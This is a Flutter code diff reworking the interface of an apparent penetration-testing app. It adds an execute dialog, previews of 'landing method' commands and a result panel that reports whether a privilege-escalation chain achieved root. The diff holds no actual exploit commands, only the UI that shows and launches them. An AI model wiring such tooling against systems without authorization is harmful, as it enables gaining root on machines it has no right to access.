-        borderRadius: BorderRadius.circular(8),
-        border: Border.all(
-          color: hasResult
-              ? (isError
-                    ? AppColors.red.withValues(alpha: 0.4)
-                    : AppColors.primary.withValues(alpha: 0.4))
-              : AppColors.border,
         ),
       ),
+      actions: [
+        TextButton(
+          onPressed: _executing ? null : () => Navigator.of(context).pop(),
+          child: const Text('关闭'),
+        ),
+        FilledButton.icon(
+          onPressed: _executing ? null : _execute,
+          icon: _executing
+              ? const SizedBox(
+                  width: 14,
+                  height: 14,
+                  child: CircularProgressIndicator(
+                    strokeWidth: 1.5,
+                    color: Colors.white,
+                  ),
+                )
+              : const Icon(Icons.rocket_launch_outlined, size: 16),
+          label: Text(_executing ? '执行中…' : '确认并执行'),
+          style: FilledButton.styleFrom(
+            backgroundColor: AppColors.red,
+            foregroundColor: Colors.white,
+          ),
+        ),
+      ],
+    );
+  }
+}
+
+class _LandingTile extends StatelessWidget {
+  const _LandingTile({required this.landing});
+
+  final LandingMethod landing;
+
+  @override
+  Widget build(BuildContext context) => Container(
+    padding: const EdgeInsets.all(10),
+    decoration: BoxDecoration(
+      color: AppColors.bgCard,
+      borderRadius: BorderRadius.circular(6),
+      border: Border.all(color: AppColors.border),
+    ),
+    child: Column(
+      crossAxisAlignment: CrossAxisAlignment.start,
+      children: [
+        Text(
+          '落地方式：${landing.name}',
+          style: AppTextStyles.body(size: 13).copyWith(
+            fontWeight: FontWeight.w600,
+          ),
+        ),
+        const SizedBox(height: 2),
+        Text(
+          landing.description,
+          style: AppTextStyles.caption(size: 11, color: AppColors.textMuted),
+        ),
+      ],
+    ),
+  );
+}
+
+class _CommandPreview extends StatelessWidget {
+  const _CommandPreview({required this.label, required this.command});
+
+  final String label;
+  final String command;
+
+  @override
+  Widget build(BuildContext context) => Column(
+    crossAxisAlignment: CrossAxisAlignment.start,
+    children: [
+      Text(label, style: AppTextStyles.caption(size: 11, color: AppColors.textMuted)),
+      const SizedBox(height: 3),
+      Container(
+        width: double.infinity,
+        padding: const EdgeInsets.all(8),
+        constraints: const BoxConstraints(maxHeight: 120),
+        decoration: BoxDecoration(
+          color: AppColors.bgDark,
+          borderRadius: BorderRadius.circular(4),
+          border: Border.all(color: AppColors.border),
+        ),
+        child: SingleChildScrollView(
+          child: SelectableText(
+            command,
+            style: AppTextStyles.terminal(size: 11, color: AppColors.cyan),
+          ),
+        ),
+      ),
+    ],
+  );
+}
+
+class _ResultBlock extends StatelessWidget {
+  const _ResultBlock({required this.result});
+
+  final PrivEscChainResult result;
+
+  @override
+  Widget build(BuildContext context) {
+    final color = result.fullyVerified ? AppColors.primary : AppColors.red;
+    final title = result.fullyVerified
+        ? '✓ 提权成功，root 已落地'
+        : (result.deployOk ? '✗ 落地成功但验证未通过' : '✗ 执行失败');
+    return Container(
+      width: double.infinity,
+      padding: const EdgeInsets.all(10),
+      decoration: BoxDecoration(
+        color: color.withValues(alpha: 0.08),
+        borderRadius: BorderRadius.circular(6),
+        border: Border.all(color: color.withValues(alpha: 0.35)),
+      ),
       child: Column(
         crossAxisAlignment: CrossAxisAlignment.start,
         children: [
-          Padding(
-            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
-            child: Row(
-              crossAxisAlignment: CrossAxisAlignment.start,
-              children: [
-                Expanded(
-                  child: Column(
-                    crossAxisAlignment: CrossAxisAlignment.start,
-                    children: [
-                      Text(
-                        item.name,
-                        style: AppTextStyles.body(
-                          size: 13,
-                          color: AppColors.textPrimary,
-                        ),
-                      ),
-                      const SizedBox(height: 2),
-                      Text(
-                        item.description,
-                        style: AppTextStyles.caption(
-                          size: 11,
-                          color: AppColors.textMuted,
-                        ),
-                      ),
-                      const SizedBox(height: 5),
-                      Container(
-                        padding: const EdgeInsets.symmetric(
-                          horizontal: 6,
-                          vertical: 3,
-                        ),
-                        decoration: BoxDecoration(
-                          color: AppColors.bgDark,
-                          borderRadius: BorderRadius.circular(4),
-                        ),
-                        child: Text(
-                          item.command.length > 72
-                              ? '${item.command.substring(0, 72)}…'
-                              : item.command,
-                          style: const TextStyle(
-                            fontFamily: 'Monaco',
-                            fontFamilyFallback: ['Courier New', 'monospace'],
-                            fontSize: 10.5,
-                            color: AppColors.textSecondary,
-                          ),
-                        ),
-                      ),
-                    ],
-                  ),
-                ),
-                const SizedBox(width: 10),
-                SizedBox(
-                  width: 52,
-                  height: 28,
-                  child: isRunning
-                      ? Center(
-                          child: SizedBox(
-                            width: 14,
-                            height: 14,
-                            child: CircularProgressIndicator(
-                              strokeWidth: 1.5,
-                              color: color,
-                            ),
-                          ),
-                        )
-                      : OutlinedButton(
-                          onPressed: onRun,
-                          style: OutlinedButton.styleFrom(
-                            foregroundColor: color,
-                            side: BorderSide(
-                              color: color.withValues(alpha: 0.5),
-                            ),
-                            padding: EdgeInsets.zero,
-                            shape: RoundedRectangleBorder(
-                              borderRadius: BorderRadius.circular(6),
-                            ),
-                          ),
-                          child: Text(
-                            hasResult ? 'Retry' : 'Run',
-                            style: AppTextStyles.caption(
-                              size: 11,
-                              color: color,
-                            ),
-                          ),
-                        ),
-                ),
-              ],
+          Text(
+            title,
+            style: AppTextStyles.body(size: 13).copyWith(
+              fontWeight: FontWeight.w600,
+              color: color,
             ),
           ),
-          if (hasResult)
-            Container(
-              width: double.infinity,
-              decoration: BoxDecoration(
-                color: isError
-                    ? AppColors.red.withValues(alpha: 0.05)
-                    : AppColors.bgDark.withValues(alpha: 0.8),
-                borderRadius: const BorderRadius.only(
-                  bottomLeft: Radius.circular(8),
-                  bottomRight: Radius.circular(8),
-                ),
-                border: Border(
-                  top: BorderSide(
-                    color: isError
-                        ? AppColors.red.withValues(alpha: 0.3)
-                        : AppColors.border,
-                  ),
-                ),
-              ),
-              padding: const EdgeInsets.all(10),
-              child: SelectableText(
-                isNoOutput ? '(no output)' : result!,
-                style: TextStyle(
-                  fontFamily: 'Monaco',
-                  fontFamilyFallback: const ['Courier New', 'monospace'],
-                  fontSize: 11.5,
-                  height: 1.6,
-                  color: isError
-                      ? AppColors.red
-                      : (isNoOutput
-                            ? AppColors.textMuted
-                            : const Color(0xFFB8C0CC)),
-                ),
-              ),
-            ),
+          const SizedBox(height: 6),
+          Text('执行输出', style: AppTextStyles.caption(size: 10, color: AppColors.textMuted)),
+          SelectableText(
+            result.deployOutput.isEmpty ? '(空)' : result.deployOutput,
+            style: AppTextStyles.terminal(
+                size: 10.5, color: AppColors.textSecondary),
+          ),
+          const SizedBox(height: 6),
+          Text('验证输出', style: AppTextStyles.caption(size: 10, color: AppColors.textMuted)),
+          SelectableText(
+            result.verifyOutput.isEmpty ? '(空)' : result.verifyOutput,
+            style: AppTextStyles.terminal(
+                size: 10.5, color: AppColors.textSecondary),
+          ),
         ],
       ),
     );
